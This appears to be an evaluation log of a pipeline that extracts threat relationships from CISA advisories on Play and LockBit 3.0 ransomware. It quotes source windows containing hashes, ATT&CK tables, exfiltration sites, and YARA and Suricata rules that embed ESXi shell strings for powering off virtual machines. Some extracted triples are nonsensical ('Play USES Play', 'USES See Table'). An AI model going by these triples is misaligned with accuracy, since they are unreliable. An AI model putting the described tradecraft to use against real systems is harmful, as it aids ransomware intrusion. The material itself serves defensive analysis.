An anti-malware and anti-virus program for the Microsoft Windows operating system. Play actors have accessed IOBit to disable antivirus software.
PsExec
A tool designed to run programs and execute commands on remote systems.
PowerTool
A Windows utility designed to improve speed, remove bloatware, protect privacy, and eliminate data collection, among other things.
PowerShell
A cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.
Cobalt Strike
A penetration testing tool used by security professionals to test the security of networks and systems. Play ransomware actors have used it to assist with lateral movement and file execution.
Mimikatz
Allows users to view and save authentication credentials such as Kerberos tickets. Play ransomware actors have used it to add accounts to domain controllers.
WinPEAS
Used to search for additional privilege escalation paths.
WinRAR
Used to split compromised data into segments and to compress files into .RAR format for exfiltration.
WinSCP
Windows Secure Copy is a free and open source Secure Shell (SSH) File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Play ransomware actors have used it to transfer data [T1048] from a compromised network to actor-controlled accounts.
Microsoft Nltest
Used by Play ransomware actors for network discovery.
Nekto / PriviCMD
Used by Play ransomware actors for privilege escalation.
Process Hacker
Used to enumerate running processes on a system.
Plink
Used to establish persistent SSH tunnels.
Update June 4, 2025:
Indicators of Compromise
See Table 2 for Play ransomware IOCs obtained from FBI investigations as of January 2025.
Table 2: Hashes Associated with Play Ransomware Actors
Hashes (SHA 256 and SHA 1)
Description
47B7B2DD88959CD7224A5542AE8D5BCE928BFC986BF0D0321532A7515C244A1E
SVCHost.dll
Backdoor
75B525B220169F07AECFB3B1991702FBD9A1E170CAF0040D1FCB07C3E819F54A


- Play -> USES_TECHNIQUE -> T1048
  Literal support: Play ransomware actors have used it to transfer data [T1048] from a compromised network to actor-controlled accounts.
- Play Ransomware Actors -> USES -> Play
  Literal support: Table 2: Hashes Associated with Play Ransomware Actors
- Play Ransomware Actors -> USES -> PsExec
  Literal support: PsExec
- Play Ransomware Actors -> USES -> A Windows
  Literal support: A Windows utility designed to improve speed, remove bloatware, protect privacy, and eliminate data collection, among other things.

## AA23-352A:evaluation:llama500:11828:12848

Status: candidates_ready_for_review
Case time: 1.10 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

D0321532A7515C244A1E
SVCHost.dll
Backdoor
75B525B220169F07AECFB3B1991702FBD9A1E170CAF0040D1FCB07C3E819F54A
453257C3494ADDAFB39CB6815862403E827947A1E7737EB8168CD10522465DEB
C59F3C8D61D940B56436C14BC148C1FE98862921B8F7BAD97FBC96B31D71193C
GRIXBA
Gt_net.exe
Custom data gathering tool
1409E010675BF4A40DB0A845B60DB3AAE5B302834E80ADEEC884AEBC55ECCBF7
PSexesvc.exe
Custom Play “psexesvc”
0E408AED1ACF902A9F97ABF71CF0DD354024109C5D52A79054C421BE35D93549
HRsword.exe
Disables endpoint protection
90040340EE101CAC7831D7035230AC8AD4224D432E5636F34F13AA1C4A0C2041
Usysdiag.exe
Associated with HRsword; changes settings of System certificates
3D86555ACAA19AEDDB5896071D1E3711B062EDBE
fThe9C.exe
6DE8DD5757F9A3AC5E2AC28E8A77682D7A29BE25C106F785A061DCF582A20DC6
Hi.exe
Associated with ransomware
75404543DE25513B376F097CEB383E8EFB9C9B95DA8945FD4AA37C7B2F226212
SystemBC Malware EXE
7A42F96599DF8090CF89D6E3CE4316D24C6C00E499C8557A2E09D61C00C11986
7DEA671BE77A2CA5772B86CF8831B02BFF0567BCE6A3AE023825AA40354F8ACA
SystemBC malware DLL


- Play -> USES -> Play
  Literal support: Custom Play “psexesvc”

## AA23-352A:evaluation:llama500:12733:14443

Status: validation_failed
Case time: 3.93 seconds; attempts: 2.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

00E499C8557A2E09D61C00C11986
7DEA671BE77A2CA5772B86CF8831B02BFF0567BCE6A3AE023825AA40354F8ACA
SystemBC malware DLL
967DAFF362E63FF45526F585B7944488ACE1BB5BB5B30FA40D56557F1C538D09
SHA256
Hash of public ECDSA key
859165041D75FBA3759C5533E324225F355C8A07B4645B984192AD6BEF06DB1A
SHA-256
Hash of public ED25519 Key for WinSCP Server
511F63455CA4F83B0347B65DDA17585AD02591A9F23D8E234E5CE1321AA3381A
SHA-256
Hash of public ED25519 Key WinSCP Server
372F7B45A141BB0709D578BC716CBCA03104258822C4290CCBEB600223850158
SHA-256
Hash of public ED25519 Key WinSCP Server
End Update
MITRE ATT&CK Tactics and Techniques
See Table 3–Table 11 for all referenced threat actor tactics and techniques in this advisory.
Table 3: Play ATT&CK Techniques for Enterprise for Initial Access
Technique Title
ID
Use
Valid Accounts
T1078
Play ransomware actors obtain and abuse existing account credentials to gain initial access.
Exploit Public Facing Application
T1190
Play ransomware actors exploit vulnerabilities in internet-facing systems to gain access to networks.
External Remote Services
T1133
Play ransomware actors have used remote access services, such as RDP/VPN connection to gain initial access.
Update June 4, 2025:
Command and Scripting Interpreter: PowerShell
T1059.001
Play ransomware actors leveraged PowerShell commands to achieve RCE with a newly disclosed vulnerability.
End Update
Table 4: Play ATT&CK Techniques for Enterprise for Discovery
Technique Title
ID
Use
System Network Configuration Discovery
T1016
Play ransomware actors use tools like GRIXBA to identify network configurations and settings.
Software Discovery: Security Software Discovery
T1518.001
Play ransomware actors scan for antivirus software.


Error: Repeated selected relationship.

## AA23-352A:evaluation:llama500:14145:16344

Status: candidates_ready_for_review
Case time: 7.50 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

 Enterprise for Discovery
Technique Title
ID
Use
System Network Configuration Discovery
T1016
Play ransomware actors use tools like GRIXBA to identify network configurations and settings.
Software Discovery: Security Software Discovery
T1518.001
Play ransomware actors scan for antivirus software.
Table 5: Play ATT&CK Techniques for Enterprise for Defense Evasion
Technique Title
ID
Use
Impair Defenses: Disable or Modify Tools
T1562.001
Play ransomware actors use tools like GMER, IOBit, and PowerTool to disable antivirus software.
Indicator Removal: Clear Windows Event Logs
T1070.001
Play ransomware actors delete logs or other indicators of compromise to hide intrusion activity.
Table 6: Play ATT&CK Techniques for Enterprise for Credential Access
Technique Title
ID
Use
Unsecured Credentials
T1552
Play ransomware actors attempt to identify and exploit credentials stored insecurely on a compromised network.
OS Credential Dumping
T1003
Play ransomware actors use tools like Mimikatz to dump credentials.
Table 7: Play ATT&CK Techniques for Enterprise for Lateral Movement
Technique Title
ID
Use
Lateral Tool Transfer
T1570
Play ransomware actors distribute executables within the compromised environment.
Table 8: Play ATT&CK Techniques for Enterprise for Command and Control
Technique Title
ID
Use
Domain Policy Modification: Group Policy Modification
T1484.001
Play ransomware actors distribute executables via Group Policy Objects.
Table 9: Play ATT&CK Techniques for Enterprise for Collection
Technique Title
ID
Use
Archive Collected Data: Archive via Utility
T1560.001
Play ransomware actors use tools like WinRAR to compress files.
Table 10: Play ATT&CK Techniques for Enterprise for Exfiltration
Technique Title
ID
Use
Exfiltration Over Alternative Protocol
T1048
Play ransomware actors use file transfer tools like WinSCP to transfer data.
Table 11: Play ATT&CK Techniques for Enterprise for Impact
Technique Title
ID
Use
Data Encrypted for Impact
T1486
Play ransomware actors encrypt data on target systems to interrupt availability to system and network resources.
Financial Theft
T1657
Play ransomware actors use a double-extortion model for financial gain.
Update June 4, 2025:


- Play -> USES -> GRIXBA
  Literal support: Play ransomware actors use tools like GRIXBA to identify network configurations and settings.
- Play -> USES -> GMER
  Literal support: Play ransomware actors use tools like GMER, IOBit, and PowerTool to disable antivirus software.
- Play -> USES -> IOBit
  Literal support: Play ransomware actors use tools like GMER, IOBit, and PowerTool to disable antivirus software.
- Play -> USES -> PowerTool
  Literal support: Play ransomware actors use tools like GMER, IOBit, and PowerTool to disable antivirus software.

## AA23-352A:evaluation:llama500:16080:17724

Status: validation_failed
Case time: 4.22 seconds; attempts: 2.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

Use
Data Encrypted for Impact
T1486
Play ransomware actors encrypt data on target systems to interrupt availability to system and network resources.
Financial Theft
T1657
Play ransomware actors use a double-extortion model for financial gain.
Update June 4, 2025:
Below is a copy of YARA rules related to the ESXi variant:
rule PlayForESXi
{
meta:
description = "Detects PLAY ransomware targeting ESXi Hypervisors"
date = "2025-01"
filetype = "elf"
maltype = "ransomware"
strings:
$encrypt_str = "encrypt:"
$first_step_str = "First step is done."
$vmfs_path_str = "/vmfs/volumes"
$PLAY_ext_str = ".PLAY" fullword
$stop_list_mode_str = "stop list mode"
$hosts_in_exclusion_str = "hosts in exclusion:"
$error_in_stop_list_str = "Error, check stop list file, exit."
$complete_str = "Complete."
$dev_urandom_path_str = "/dev/urandom"
$targeted_ext_vmdk = ".vmdk" fullword
$targeted_ext_vmem = ".vmem" fullword
$targeted_ext_vmsd = ".vmsd" fullword
$targeted_ext_vmsn = ".vmsn" fullword
$targeted_ext_vmx = ".vmx" fullword
$targeted_ext_vmxf = ".vmxf" fullword
$targeted_ext_vswp = ".vswp" fullword
$targeted_ext_vmss = ".vmss" fullword
$targeted_ext_nvram = ".nvram" fullword
$targeted_ext_vmtx = ".vmtx" fullword
$targeted_ext_log = ".log" fullword
$vim_cmd_power_off_vms_str = "vim-cmd vmsvc/power.off"
$get_storage_shell_cmd_str = "esxcli storage filesystem list > storage"
$get_machines_shell_cmd_str = "vim-cmd vmsvc/getallvms > machines"
condition:
all of them
}
Below are copies of YARA and Suricata rules related to Play’s custom data gathering tool, Grixba:
rule GRXBA
{
meta:
description = "Detects the infostealer GRXBA version 1.1.3.0"


Error: Repeated selected relationship.

## AA23-352A:evaluation:llama500:17529:18539

Status: candidates_ready_for_review
Case time: 1.00 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

:
all of them
}
Below are copies of YARA and Suricata rules related to Play’s custom data gathering tool, Grixba:
rule GRXBA
{
meta:
description = "Detects the infostealer GRXBA version 1.1.3.0"
date = "2025-01"
filetype = "pe"
maltype = "infostealer"
strings:
$GRB_NET_hex = { 47 52 42 5F 4E 45 54 }
$GRB_NET_exe_hex = { 47 52 42 5F 4E 45 54 2E 65 78 65 00 }
$Copyright_Zabbix_2023_hex = { 43 6F 70 79 72 69 67 68 74 20 5A 61 62 62 69 78 20 32 30 32 33 00 }
$GRB_NT_hex = { 47 52 42 5F 4E 54 00 }
$help_string_1_hex = { 48 65 6C 70 54 65 78 74 2B 46 69 6C 65 2E 74 78 74 2F 31 32 37 2E 30 2E 30 2E 31 2D 31 32 37 2E 30 2E 30 2E 32 35 35 2F 31 32 37 2E 30 2E 30 2E 31 2D 32 34 }
$help_string_2_hex = { 48 65 6C 70 54 65 78 74 5E 44 6F 6D 61 69 6E 20 6E 61 6D 65 20 66 6F 72 20 55 73 65 72 73 20 61 6E 64 20 43 6F 6D 70 75 74 65 72 73 20 67 61 74 68 65 72 69 6E 67 2E 20 49 66 20 6E 6F 74 20 73 65 74 20 77 69 6C 6C 20 62 65 20 75 73 65 64 20 64 6F 6D 61 69 6E 20 6F 66 20 63 75 72 72 65 6E 74 20 75 73 65 72 }


- Play -> USES -> Play
  Literal support: Below are copies of YARA and Suricata rules related to Play’s custom data gathering tool, Grixba:

## AA23-352A:evaluation:llama500:18455:19130

Status: empty_extraction
Case time: 0.30 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

 75 73 65 64 20 64 6F 6D 61 69 6E 20 6F 66 20 63 75 72 72 65 6E 74 20 75 73 65 72 }
$help_string_3_hex = { 48 65 6C 70 54 65 78 74 62 47 52 42 20 6D 6F 64 65 2E 20 73 63 61 6E 2F 73 63 61 6E 61 6C 6C 2F 63 6C 72 2E 20 73 63 61 6E 20 2D 20 6E 65 74 77 6F 72 6B 20 73 63 61 6E 6E 65 72 2E 20 73 63 61 6E 61 6C 6C 20 2D 20 67 72 61 62 20 61 6C 6C 2E 20 20 63 6C 72 20 2D 20 65 76 65 6E 74 20 6C 6F 67 73 20 63 6C 65 61 6E 65 72 }
$help_string_4_hex = { 48 65 6C 70 54 65 78 74 3A 49 6E 70 75 74 3A 20 66 2F 72 2F 73 2E 20 66 20 2D 20 66 69 6C 65 2C 20 72 20 2D 20 72 61 6E 67 65 2C 20 73 20 2D 20 73 75 62 6E 65 74 2C 20 64 20 2D 20 64 6F 6D 61 69 6E }
condition:
all of them
}



## AA23-352A:evaluation:llama500:19034:19853

Status: empty_extraction
Case time: 0.23 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

20 73 20 2D 20 73 75 62 6E 65 74 2C 20 64 20 2D 20 64 6F 6D 61 69 6E }
condition:
all of them
}
Rule Suricataalert smb any any -> any any (noalert; content:"|55 00 73 00 65 00 72 00 73 00 5c 00 41 00 6c 00 6c 00 20 00 55 00 73 00 65 00 72 00 73 00 5c 00 41 00 70 00 70 00 44 00 61 00 74 00 61 00 5c 00 4c 00 6f 00 63 00 61 00 6c 00 5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 5c 00 57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 5c 00 57 00 65 00 62 00 43 00 61 00 63 00 68 00 65 00|"; flow:to_server; flowbits:set,GRXBA_webhist_path_1_detected ;sid:1900002; rev:1;)
alert smb any any -> any any (noalert; content:"|55 00 73 00 65 00 72 00 73 00 5c 00 41 00 6c 00 6c 00 20 00 55 00 73 00 65 00 72 00 73 00 5c 00 41 00 70 00 70 00 44 00 61 00 74 00 61 00 5c 00 52 00 6f 00 61 00 6d 00 69 00 6e 00 67 00 5c 00 


## AA23-352A:evaluation:llama500:19771:20652

Status: empty_extraction
Case time: 0.24 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

 00 44 00 61 00 74 00 61 00 5c 00 52 00 6f 00 61 00 6d 00 69 00 6e 00 67 00 5c 00 4d 00 6f 00 6f 00 6e 00 63 00 68 00 69 00 6c 00 64 00 20 00 50 00 72 00 6f 00 64 00 75 00 63 00 74 00 69 00 6f 00 6e 00 73 00 5c 00 50 00 61 00 6c 00 65 00 20 00 4d 00 6f 00 6f 00 6e 00 5c 00 50 00 72 00 6f 00 66 00 69 00 6c 00 65 00 73 00|"; flow:to_server; flowbits:set,GRXBA_webhist_path_2_detected ;sid:1900003; rev:1;)
alert smb any any -> any any (noalert; content:"|55 00 73 00 65 00 72 00 73 00 5c 00 41 00 6c 00 6c 00 20 00 55 00 73 00 65 00 72 00 73 00 5c 00 41 00 70 00 70 00 44 00 61 00 74 00 61 00 5c 00 52 00 6f 00 61 00 6d 00 69 00 6e 00 67 00 5c 00 43 00 6f 00 6d 00 6f 00 64 00 6f 00 5c 00 49 00 63 00 65 00 44 00 72 00 61 00 67 00 6f 00 6e 00 5c 00 50 00 72 00 6f 00 66 00 69 00 6c 00 65 00 73 00|"; flow:to_server; flowbits:set,GRXBA_webhist_path_3_detected ;sid:1900004; rev:1;)



## AA23-352A:evaluation:llama500:20528:21542

Status: empty_extraction
Case time: 0.26 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

 00 6f 00 66 00 69 00 6c 00 65 00 73 00|"; flow:to_server; flowbits:set,GRXBA_webhist_path_3_detected ;sid:1900004; rev:1;)
alert smb any any -> any any (noalert; content:"|55 00 73 00 65 00 72 00 73 00 5c 00 41 00 6c 00 6c 00 20 00 55 00 73 00 65 00 72 00 73 00 5c 00 41 00 70 00 70 00 44 00 61 00 74 00 61 00 5c 00 4c 00 6f 00 63 00 61 00 6c 00 5c 00 54 00 65 00 6e 00 63 00 65 00 6e 00 74 00 5c 00 51 00 51 00 42 00 72 00 6f 00 77 00 73 00 65 00 72 00 5c 00 55 00 73 00 65 00 72 00 20 00 44 00 61 00 74 00 61 00|"; flow:to_server; flowbits:set,GRXBA_webhist_path_4_detected ;sid:1900005; rev:1;)
alert smb any any -> any any (noalert; content:"|55 00 73 00 65 00 72 00 73 00 5c 00 41 00 6c 00 6c 00 20 00 55 00 73 00 65 00 72 00 73 00 5c 00 41 00 70 00 70 00 44 00 61 00 74 00 61 00 5c 00 4c 00 6f 00 63 00 61 00 6c 00 5c 00 56 00 69 00 76 00 61 00 6c 00 64 00 69 00 5c 00 55 00 73 00 65 00 72 00 20 00 44 00 61 00 74 00 61 00|"; flow:to_server; flowbits:set,GRXBA_webhist_path_5_detected ;sid:1900006; rev:1;)



## AA23-352A:evaluation:llama500:21415:22258

Status: empty_extraction
Case time: 0.23 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

 65 00 72 00 20 00 44 00 61 00 74 00 61 00|"; flow:to_server; flowbits:set,GRXBA_webhist_path_5_detected ;sid:1900006; rev:1;)
alert smb any any -> any any (noalert; content:"|55 00 73 00 65 00 72 00 73 00 5c 00 41 00 6c 00 6c 00 20 00 55 00 73 00 65 00 72 00 73 00 5c 00 41 00 70 00 70 00 44 00 61 00 74 00 61 00 5c 00 4c 00 6f 00 63 00 61 00 6c 00 5c 00 43 00 6f 00 63 00 43 00 6f 00 63 00 5c 00 42 00 72 00 6f 00 77 00 73 00 65 00 72 00 5c 00 55 00 73 00 65 00 72 00 20 00 44 00 61 00 74 00 61 00|"; flow:to_server; flowbits:set,GRXBA_webhist_path_6_detected ;sid:1900007; rev:1;)
alert smb any any -> any any (noalert; content:"|55 00 73 00 65 00 72 00 73 00 5c 00 41 00 6c 00 6c 00 20 00 55 00 73 00 65 00 72 00 73 00 5c 00 41 00 70 00 70 00 44 00 61 00 74 00 61 00 5c 00 4c 00 6f 00 63 00 61 00 6c 00 5c 00 53 00 6f 00 67 00 6f 00 75 00 


## AA23-352A:evaluation:llama500:22179:22895

Status: empty_extraction
Case time: 0.20 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

 61 00 5c 00 4c 00 6f 00 63 00 61 00 6c 00 5c 00 53 00 6f 00 67 00 6f 00 75 00 45 00 78 00 70 00 6c 00 6f 00 72 00 65 00 72 00 5c 00 57 00 65 00 62 00 6b 00 69 00 74 00 5c 00 55 00 73 00 65 00 72 00 20 00 44 00 61 00 74 00 61 00|"; flow:to_server; flowbits:set,GRXBA_webhist_path_7_detected ;sid:1900008; rev:1;)
alert smb any any -> any any (noalert; content:"|55 00 73 00 65 00 72 00 73 00 5c 00 44 00 65 00 66 00 61 00 75 00 6c 00 74 00 5c 00 41 00 70 00 70 00 44 00 61 00 74 00 61 00 5c 00 4c 00 6f 00 63 00 61 00 6c 00 5c 00 56 00 69 00 76 00 61 00 6c 00 64 00 69 00 5c 00 55 00 73 00 65 00 72 00 20 00 44 00 61 00 74 00 61 00|"; flow:to_server; flowbits:set,GRXBA_webhist_path_8_detected; sid:1900009; rev:1;)



## AA23-352A:evaluation:llama500:22768:24022

Status: empty_extraction
Case time: 0.29 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

 65 00 72 00 20 00 44 00 61 00 74 00 61 00|"; flow:to_server; flowbits:set,GRXBA_webhist_path_8_detected; sid:1900009; rev:1;)
alert smb any any -> any any (noalert; content:"|55 00 73 00 65 00 72 00 73 00 5c 00 44 00 65 00 66 00 61 00 75 00 6c 00 74 00 20 00 55 00 73 00 65 00 72 00 5c 00 41 00 70 00 70 00 44 00 61 00 74 00 61 00 5c 00 52 00 6f 00 61 00 6d 00 69 00 6e 00 67 00 5c 00 4f 00 70 00 65 00 72 00 61 00 20 00 53 00 6f 00 66 00 74 00 77 00 61 00 72 00 65 00 5c 00 4f 00 70 00 65 00 72 00 61 00 20 00 53 00 74 00 61 00 62 00 6c 00 65 00|"; flow:to_server; flowbits:set,GRXBA_webhist_path_9_detected ;sid:1900010; rev:1;)
alert smb any any -> any any (msg:"GRIXBA web history scanning detected - potential indicator of imminent PLAY Ransomware attack"; flowbits:isset,GRXBA_webhist_path_1_detected; flowbits:isset,GRXBA_webhist_path_2_detected; flowbits:isset,GRXBA_webhist_path_3_detected; flowbits:isset,GRXBA_webhist_path_4_detected; flowbits:isset,GRXBA_webhist_path_5_detected;flowbits:isset,GRXBA_webhist_path_6_detected; flowbits:isset,GRXBA_webhist_path_7_detected; flowbits:isset,GRXBA_webhist_path_8_detected; flowbits:isset,GRXBA_webhist_path_9_detected; flowbits:set,GRXBA_hit_found; classtype:attempted-recon; sid:1900011; rev:1;)



## AA23-352A:evaluation:llama500:23163:24531

Status: empty_extraction
Case time: 0.30 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

00 65 00 72 00 61 00 20 00 53 00 6f 00 66 00 74 00 77 00 61 00 72 00 65 00 5c 00 4f 00 70 00 65 00 72 00 61 00 20 00 53 00 74 00 61 00 62 00 6c 00 65 00|"; flow:to_server; flowbits:set,GRXBA_webhist_path_9_detected ;sid:1900010; rev:1;)
alert smb any any -> any any (msg:"GRIXBA web history scanning detected - potential indicator of imminent PLAY Ransomware attack"; flowbits:isset,GRXBA_webhist_path_1_detected; flowbits:isset,GRXBA_webhist_path_2_detected; flowbits:isset,GRXBA_webhist_path_3_detected; flowbits:isset,GRXBA_webhist_path_4_detected; flowbits:isset,GRXBA_webhist_path_5_detected;flowbits:isset,GRXBA_webhist_path_6_detected; flowbits:isset,GRXBA_webhist_path_7_detected; flowbits:isset,GRXBA_webhist_path_8_detected; flowbits:isset,GRXBA_webhist_path_9_detected; flowbits:set,GRXBA_hit_found; classtype:attempted-recon; sid:1900011; rev:1;)
alert smb any any -> any any (noalert; flowbits:isset,GRXBA_hit_found; flowbits:unset,GRXBA_webhist_path_1_detected;flowbits:unset,GRXBA_webhist_path_2_detected;flowbits:unset,GRXBA_webhist_path_3_detected;flowbits:unset,GRXBA_webhist_path_4_detected;flowbits:unset,GRXBA_webhist_path_5_detected;flowbits:unset,GRXBA_webhist_path_6_detected;flowbits:unset,GRXBA_webhist_path_7_detected;flowbits:unset,GRXBA_webhist_path_8_detected;flowbits:unset,GRXBA_webhist_path_9_detected; sid:1900012; rev:1;)
End Update



## AA23-075A:evaluation:llama500:2065:4310

Status: candidates_ready_for_review
Case time: 1.00 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:


Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK for Enterprise.
CAPABILITIES
LockBit 3.0, also known as “LockBit Black,” is more modular and evasive than its previous versions and shares similarities with Blackmatter and Blackcat ransomware.
LockBit 3.0 is configured upon compilation with many different options that determine the behavior of the ransomware. Upon the actual execution of the ransomware within a victim environment, various arguments can be supplied to further modify the behavior of the ransomware. For example, LockBit 3.0 accepts additional arguments for specific operations in lateral movement and rebooting into Safe Mode (see LockBit Command Line parameters under Indicators of Compromise). If a LockBit affiliate does not have access to passwordless LockBit 3.0 ransomware, then a password argument is mandatory during the execution of the ransomware. LockBit 3.0 affiliates failing to enter the correct password will be unable to execute the ransomware [T1480.001]. The password is a cryptographic key which decodes the LockBit 3.0 executable. By protecting the code in such a manner, LockBit 3.0 hinders malware detection and analysis with the code being unexecutable and unreadable in its encrypted form. Signature-based detections may fail to detect the LockBit 3.0 executable as the executable’s encrypted potion will vary based on the cryptographic key used for encryption while also generating a unique hash. When provided the correct password, LockBit 3.0 will decrypt the main component, continue to decrypt or decompress its code, and execute the ransomware.
LockBit 3.0 will only infect machines that do not have language settings matching a defined exclusion list. However, whether a system language is checked at runtime is determined by a configuration flag originally set at compilation time. Languages on the exclusion list include, but are not limited to, Romanian (Moldova), Arabic (Syria), and Tatar (Russia). If a language from the exclusion list is detected [T1614.001], LockBit 3.0 will stop execution without infecting the system.
INITIAL ACCESS


- LockBit 3.0 -> USES_TECHNIQUE -> T1480.001
  Literal support: LockBit 3.0 affiliates failing to enter the correct password will be unable to execute the ransomware [T1480.001].

## AA23-075A:evaluation:llama500:4080:6201

Status: candidates_ready_for_review
Case time: 3.19 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:

 include, but are not limited to, Romanian (Moldova), Arabic (Syria), and Tatar (Russia). If a language from the exclusion list is detected [T1614.001], LockBit 3.0 will stop execution without infecting the system.
INITIAL ACCESS
Affiliates deploying LockBit 3.0 ransomware gain initial access to victim networks via remote desktop protocol (RDP) exploitation [T1133], drive-by compromise [T1189], phishing campaigns [T1566], abuse of valid accounts [T1078], and exploitation of public-facing applications [T1190].
EXECUTION AND INFECTION PROCESS
During the malware routine, if privileges are not sufficient, LockBit 3.0 attempts to escalate to the required privileges [TA0004]. LockBit 3.0 performs functions such as:
Enumerating system information such as hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices [T1082]
Terminating processes and services [T1489]
Launching commands [TA0002]
Enabling automatic logon for persistence and privilege escalation [T1547]
Deleting log files, files in the recycle bin folder, and shadow copies residing on disk [T1485], [T1490]
LockBit 3.0 attempts to spread across a victim network by using a preconfigured list of credentials hardcoded at compilation time or a compromised local account with elevated privileges [T1078]. When compiled, LockBit 3.0 may also enable options for spreading via Group Policy Objects and PsExec using the Server Message Block (SMB) protocol. LockBit 3.0 attempts to encrypt [T1486] data saved to any local or remote device, but skips files associated with core system functions.
After files are encrypted, LockBit 3.0 drops a ransom note with the new filename <Ransomware ID>.README.txt and changes the host’s wallpaper and icons to LockBit 3.0 branding [T1491.001]. If needed, LockBit 3.0 will send encrypted host and bot information to a command and control (C2) server [T1027].
Once completed, LockBit 3.0 may delete itself from the disk [T1070.004] as well as any Group Policy updates that were made, depending on which options were set at compilation time.
EXFILTRATION


- LockBit 3.0 -> USES_TECHNIQUE -> T1133
  Literal support: Affiliates deploying LockBit 3.0 ransomware gain initial access to victim networks via remote desktop protocol (RDP) exploitation [T1133]
- LockBit 3.0 -> USES_TECHNIQUE -> T1078
  Literal support: LockBit 3.0 attempts to spread across a victim network by using a preconfigured list of credentials hardcoded at compilation time or a compromised local account with elevated privileges [T1078].
- LockBit 3.0 -> USES_TECHNIQUE -> T1486
  Literal support: LockBit 3.0 attempts to encrypt [T1486] data saved to any local or remote device, but skips files associated with core system functions.
- LockBit 3.0 -> USES_TECHNIQUE -> T1491.001
  Literal support: After files are encrypted, LockBit 3.0 drops a ransom note with the new filename <Ransomware ID>.README.txt and changes the host’s wallpaper and icons to LockBit 3.0 branding [T1491.001].

## AA23-075A:evaluation:llama500:5977:8086

Status: candidates_ready_for_review
Case time: 3.13 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:

 control (C2) server [T1027].
Once completed, LockBit 3.0 may delete itself from the disk [T1070.004] as well as any Group Policy updates that were made, depending on which options were set at compilation time.
EXFILTRATION
LockBit 3.0 affiliates use Stealbit, a custom exfiltration tool used previously with LockBit 2.0 [TA0010]; rclone, an open-source command line cloud storage manager [T1567.002]; and publicly available file sharing services, such as MEGA [T1567.002], to exfiltrate sensitive company data files prior to encryption. While rclone and many publicly available file sharing services are primarily used for legitimate purposes, they can also be used by threat actors to aid in system compromise, network exploration, or data exfiltration. LockBit 3.0 affiliates often use other publicly available file sharing services to exfiltrate data as well [T1567] (see Table 1).
Table 1: Anonymous File Sharing Sites Used to Exfiltrate Data Before System Encryption
File Sharing Site
https://www.premiumize[.]com
https://anonfiles[.]com
https://www.sendspace[.]com
https://fex[.]net
https://transfer[.]sh
https://send.exploit[.]in
LEVERAGING FREEWARE AND OPEN-SOURCE TOOLS
LockBit affiliates have been observed using various freeware and open-source tools during their intrusions. These tools are used for a range of activities such as network reconnaissance, remote access and tunneling, credential dumping, and file exfiltration. Use of PowerShell and Batch scripts are observed across most intrusions, which focus on system discovery, reconnaissance, password/credential hunting, and privilege escalation. Artifacts of professional penetration-testing tools such as Metasploit and Cobalt Strike have also been observed. See Table 2 for a list of legitimate freeware and open-source tools LockBit affiliates have repurposed for ransomware operations:
Table 2: Freeware and Open-Source Tools Used by LockBit 3.0 Affiliates
Tool
Description
MITRE ATT&CK ID
Chocolatey
Command-line package manager for Windows.
T1072
FileZilla
Cross-platform File Transfer Protocol (FTP) application.
T1071.002
Impacket


- LockBit 3.0 -> USES_TECHNIQUE -> T1070.004
  Literal support: Once completed, LockBit 3.0 may delete itself from the disk [T1070.004] as well as any Group Policy updates that were made, depending on which options were set at compilation time.
- rclone -> USES_TECHNIQUE -> T1567.002
  Literal support: rclone, an open-source command line cloud storage manager [T1567.002]
- LockBit 3.0 -> USES_TECHNIQUE -> T1567
  Literal support: LockBit 3.0 affiliates often use other publicly available file sharing services to exfiltrate data as well [T1567] (see Table 1).
- LockBit affiliates -> USES -> See Table
  Literal support: See Table 2 for a list of legitimate freeware and open-source tools LockBit affiliates have repurposed for ransomware operations:

## AA23-075A:evaluation:llama500:7876:9861

Status: empty_extraction
Case time: 0.63 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a

Exact source window:

 Used by LockBit 3.0 Affiliates
Tool
Description
MITRE ATT&CK ID
Chocolatey
Command-line package manager for Windows.
T1072
FileZilla
Cross-platform File Transfer Protocol (FTP) application.
T1071.002
Impacket
Collection of Python classes for working with network protocols.
S0357
MEGA Ltd MegaSync
Cloud-based synchronization tool.
T1567.002
Microsoft Sysinternals ProcDump
Generates crash dumps. Commonly used to dump the contents of Local Security Authority Subsystem Service, LSASS.exe.
T1003.001
Microsoft Sysinternals PsExec
Execute a command-line process on a remote machine.
S0029
Mimikatz
Extracts credentials from system.
S0002
Ngrok
Legitimate remote-access tool abused to bypass victim network protections.
S0508
